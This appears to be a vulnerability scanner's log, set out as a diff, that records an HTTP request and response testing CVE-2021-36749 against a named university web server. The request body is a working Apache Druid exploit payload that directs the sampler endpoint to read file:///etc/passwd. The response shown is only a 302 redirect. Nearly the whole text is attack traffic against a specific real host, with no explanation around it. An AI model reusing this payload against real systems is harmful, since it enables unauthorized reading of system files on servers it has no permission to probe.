@@ -1,0 +1,32 @@
+[CVE-2021-36749] Dumped HTTP request for http://web.mup.unimelb.edu.au/druid/indexer/v1/sampler?for=connect
+
+
+POST /druid/indexer/v1/sampler?for=connect HTTP/1.1
+Host: web.mup.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 410
+Content-Type: application/json
+Accept-Encoding: gzip
+
+{"type":"index","spec":{"type":"index","ioConfig":{"type":"index","firehose":{"type":"http","uris":[" file:///etc/passwd "]}},"dataSchema":{"dataSource":"sample","parser":{"type":"string", "parseSpec":{"format":"regex","pattern":"(.*)","columns":["a"],"dimensionsSpec":{},"timestampSpec":{"column":"no_ such_ column","missingValue":"2010-01-01T00:00:00Z"}}}}},"samplerConfig":{"numRows":500,"timeoutMs":15000}}
+[CVE-2021-36749] Dumped HTTP response http://web.mup.unimelb.edu.au/druid/indexer/v1/sampler?for=connect
+
+HTTP/1.1 302 Found
+Connection: close
+Content-Length: 338
+Content-Type: text/html; charset=iso-8859-1
+Date: Wed, 06 Aug 2025 15:18:46 GMT
+Location: https://web.mup.unimelb.edu.au/druid/indexer/v1/sampler?for=connect
+Server: Apache/2.4.7 (Ubuntu)
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>302 Found</title>
+</head><body>
+<h1>Found</h1>
+<p>The document has moved <a href="https://web.mup.unimelb.edu.au/druid/indexer/v1/sampler?for=connect">here</a>.</p>
+<hr>
+<address>Apache/2.4.7 (Ubuntu) Server at web.mup.unimelb.edu.au Port 80</address>
+</body></html>
+
